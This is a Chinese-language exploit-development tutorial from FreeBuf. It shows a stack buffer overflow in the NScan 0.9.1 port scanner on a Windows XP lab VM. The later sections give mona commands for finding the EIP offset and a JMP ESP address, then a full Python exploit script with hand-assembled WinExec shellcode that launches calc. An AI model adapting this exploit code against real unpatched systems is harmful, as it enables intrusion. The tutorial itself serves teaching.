@@ -1,0 +1,297 @@
+*** 本文作者：zusheng，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
+## ![p1.jpg](https://image.3001.net/images/20180327/15221321713207.jpg!small)  
+
+## 0x01 前言
+
+漏洞-信息安全界最常见的词汇，在百度百科是这样描述的。
+
+漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。
+
+本文主要介绍的是Windows软件漏洞的利用开发教程。
+
+我花了大量的时间来研究了计算机安全领域Windows漏洞利用开发，希望能和大家分享一下，能帮助到对这方面感兴趣的朋友，如有不足，还请见谅。
+
+## 0x02 准备阶段
+
+由浅入深，从简单的入手然后慢慢的学习更复杂的系统攻击，我们先来学习一下Windows XP（32位）简单的缓冲区溢出攻击。所以我们需要准备以下工具：
+
+> 1、Windows XP SP3 32-bit系统iso镜像
+>
+> 2、Immunity Debugger-漏洞分析专用调试器
+>
+> 3、代码文本编辑器（个人喜好，我用的是notepad++）
+
+准备好上面的三个后，我们开始搭建虚拟机环境，这个我就简单的介绍一下。
+
+这里我使用的是VMware，我们打开软件后新建一个虚拟机，然后就是安装系统很简单。
+
+![p2.png](https://image.3001.net/images/20180327/15221321913624.png!small)  
+
+## 0x03 漏洞分析
+
+现在你肯定想动手试一试了，我们的目标是Windows端口扫描仪NScan版本0.9.1
+
+漏洞地址：
+
+<https://www.exploit-db.com/exploits/40297/>
+
+软件下载地址：
+
+<https://www.exploit-db.com/apps/b235ebf93610e43c8b2246ea39d71ba7-nscan091.exe>
+
+软件下载安装
+
+![p3.png](https://image.3001.net/images/20180327/15221322041763.png!small)![p3.png](image/p3.png)
+
+阅读文档我们知道漏洞出自dig.exe的Target字段，这是一个堆栈缓冲区溢出错误。
+
+### 验证
+
+现在我们来验证一下错误的触发，将1100个A字符串输入到Target字段中并点击TCP lookup，观察它是否崩溃。
+
+获取1100个a字符
+
+    
+    
+    python:
+    print 'a'*1100
+    
+
+![15221322156433.png!small](https://image.3001.net/images/20180327/15221322156433.png!small)
+
+点击后我们发现确实程序崩溃了
+
+![1522132223498.png!small](https://image.3001.net/images/20180327/1522132223498.png!small)
+
+由用户输入导致的程序崩溃是一个漏洞利用开发的开始。
+
+### 分析
+
+我们知道该程序因为我们的输入奔溃啦，现在来分析一下它为什么会崩溃。
+
+第一步：打开Immunity Debugger
+
+![15221322307602.png!small](https://image.3001.net/images/20180327/15221322307602.png!small)
+
+点击File-Open打开dig.exe
+
+![15221322373349.png!small](https://image.3001.net/images/20180327/15221322373349.png!small)
+
+点击Run program或者按F9让程序运行。
+
+![15221322431117.png!small](https://image.3001.net/images/20180327/15221322431117.png!small)
+
+运行完我们继续触发崩溃。
+
+![15221322507939.png!small](https://image.3001.net/images/20180327/15221322507939.png!small)
+
+崩溃后我们来看寄存器。
+
+![15221322583499.png!small](https://image.3001.net/images/20180327/15221322583499.png!small)
+
+看EIP寄存器0x61616161,这是哪里来的？其实它是我们输入的，字符串a的十六进制ASCII就是61。程序将字母a存入文本字段缓冲区直到溢出并替换堆栈上返回地址的内容。因此我们称为堆栈缓冲区溢出漏洞。这意味着我们可以控制EIP寄存器的值从而控制目标程序的执行流程。
+
+## 0x04 漏洞利用开发
+
+现在我们想要利用这个控制并执行我们自己的控制代码。
+
+### 寻找EIP offset
+
+首先我们需要找到EIP offset，也就是正好覆盖到EIP的偏移量以便我们精准的覆盖EIP寄存器。所以我们要知道哪4个
+a是放入到了EIP寄存器中，这就很复杂了,当然方法是有的，这里我们使用Immunity Debugger的插件mona，这样我们就避免了平常复杂的寻找方法。
+
+安装mona：
+
+<https://github.com/corelan/mona>
+
+将mona.py放在Immunity Debugger安装目录PyCommands下就行了。
+
+第一步：设置mona文本日志所在的文件夹
+
+    
+    
+    !mona config -set workingfolder c:\logs\%p
+    
+
+![15221322664340.png!small](https://image.3001.net/images/20180327/15221322664340.png!small)
+
+第二步：生成1100个测试字符
+
+    
+    
+    !mona pattern_create 1100
+    
+
+运行完在C:\logs\dig\pattern.txt中找到。
+
+![15221322733418.png!small](https://image.3001.net/images/20180327/15221322733418.png!small)
+
+第三步：复制测试字符串，将测试字符串输入到Target字段中并点击TCP lookup（步骤和前面相同）
+
+![15221322798399.png!small](https://image.3001.net/images/20180327/15221322798399.png!small)
+
+可以发现EIP地址现在是0x68423268
+
+第四步：确定偏移量
+
+    
+    
+    !mona pattern_offset 0x68423268
+    
+
+![15221322861177.png!small](https://image.3001.net/images/20180327/15221322861177.png!small)
+
+我们找到了偏移量997
+
+### 测试
+
+我们找到了，但是这对不对呢，我们来测试一下，我们使用Python脚本来生成一个Payload。
+
+    
+    
+    bfsize = 1100
+    a = "\x41"*997 
+    eip = "\x42"*4
+    exploit = a + eip
+    c = "\x43"*(bfsize-len(exploit))
+    buffer = exploit + c
+    print buffer
+    print "Buffer size: " + str(len(buffer)) + "\n"
+    
+
+很简单的一个脚本生成一个1100字符的测试payload
+
+![15221322951151.png!small](https://image.3001.net/images/20180327/15221322951151.png!small)
+
+将测试字符串输入到Target字段中并点击TCP lookup（步骤和前面相同）
+
+![15221323039758.png!small](https://image.3001.net/images/20180327/15221323039758.png!small)
+
+不出意外，EIP被精确的覆盖。
+
+### 寻找合适的地址覆盖EIP
+
+现在，我们已经证实我们可以将EIP覆盖为任意地址，那么到底覆盖为哪个地址呢？对于本教程，我们将选择ESP寄存器作为我们代码执行目标。
+
+CTRL+F2重新运行
+
+![15221323159839.png!small](https://image.3001.net/images/20180327/15221323159839.png!small)
+
+点击Run program或者按F9让程序运行然后输入指令
+
+    
+    
+    !mona jmp -r esp
+    
+
+![15221323256441.png!small](https://image.3001.net/images/20180327/15221323256441.png!small)
+
+稍作等待，我们进入mona日志目录(前面设置的目录)，可以发现jmp.txt
+
+![15221323343468.png!small](https://image.3001.net/images/20180327/15221323343468.png!small)
+
+我们通常选择kernel32.dll模块。
+
+### 开发框架
+
+准备的差不多了，我们现在来完成生成Payload的Python框架吧。
+
+    
+    
+    # -*- coding: UTF-8 -*- 
+    import struct
+    junk = "A" * 997    #偏移
+    eip = struct.pack("<L",0x7c8369f0)    #JMP ESP kernel32
+    nops = "\x90" * 10    #10字节NOP
+    fill = "\x43" * 10
+    #shellcode 要执行的代码
+    #payload
+    payload = junk + eip + nops + shellcode+fill
+    #将payload写入到文件payload.txt
+    fp = open("payload.txt","w")
+    fp.write(payload)
+    fp.close()
+    print "[+]Exploit successfully!"
+    
+
+### Shellcode
+
+完事具备，只欠东风。没错，我们还缺少shellcode，这个很关键，没有这个只是空谈利用。
+
+    
+    
+    shellcode = "\x31\xC9"                    # xor ecx,ecx
+    shellcode += "\x51"                        # push ecx
+    shellcode += "\x68\x63\x61\x6C\x63"        # push 0x636c6163
+    shellcode += "\x54"                        # push dword ptr esp
+    shellcode += "\xB8\xAD\x23\x86\x7C"        # mov eax,0x7c8623AD
+    shellcode += "\xFF\xD0"                    # call eax
+    
+
+前面我们已经载入了kernel32.dll模块，接下来调用一下WinExec函数打开calc(计算器)就好了。
+
+初学者有可能看不到，其实就是在调用函数，将函数的参数从右到左压入栈中然后调用。
+
+WinExec函数地址在各版本系统可能不同，我们使用PE软件可以获取到，这里我使用的是StudyPE+ x86。
+
+文件-打开文件（加载kernel32.dll模块）
+
+![15221323418465.png!small](https://image.3001.net/images/20180327/15221323418465.png!small)
+
+记住映像基址
+
+![15221323472046.png!small](https://image.3001.net/images/20180327/15221323472046.png!small)
+
+在导出选项卡找到函数并记住偏移地址
+
+偏移地址+映像基址=函数在虚拟内存中的地址
+
+### 测试
+
+    
+    
+    完整代码如下：
+    # -*- coding: UTF-8 -*- 
+    import struct
+    junk = "A" * 997    #偏移
+    eip = struct.pack("<L",0x7c8369f0)    #JMP ESP kernel32
+    nops = "\x90" * 10    #10字节NOP
+    fill = "\x43" * 10
+    #shellcode 要执行的代码
+    shellcode = "\x31\xC9"                                    # xor ecx,ecx
+    shellcode += "\x51"                                        # push ecx
+    shellcode += "\x68\x63\x61\x6C\x63"        # push 0x636c6163
+    shellcode += "\x54"                                        # push dword ptr esp
+    shellcode += "\xB8\xAD\x23\x86\x7C"        # mov eax,0x7c8623AD
+    shellcode += "\xFF\xD0"                                # call eax
+    #payload
+    payload = junk + eip + nops + shellcode+fill
+    #将payload写入到文件payload.txt
+    fp = open("payload.txt","w")
+    fp.write(payload)
+    fp.close()
+    print "[+]Exploit successfully!"
+    
+
+运行一下
+
+    
+    
+    E:\hacktools\python>python payload.py
+    [+]Exploit successfully!
+    
+
+我们复制生成的payload，将payload字符串输入到Target字段中并点击TCP lookup（步骤和前面相同）
+
+![15221323625806.png!small](https://image.3001.net/images/20180327/15221323625806.png!small)
+
+很好，我们终于一步步完成了，成功弹出了一个计算器。
+
+## 0x05 总结
+
+一步步遇到的坑也不少，希望能帮助到需要的朋友，下面来总结一下本文一些知识点吧。在文中我们一步步证码了漏洞的存在，多次使用了Immunity
+Debugger的插件mona很大减少了复杂的操作步骤，查找函数地址，简单的构建了一个弹计算器的shellcode。本人水平有限，如有不足，还请各位兄弟指出。
+
+ *** 本文作者：zusheng，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
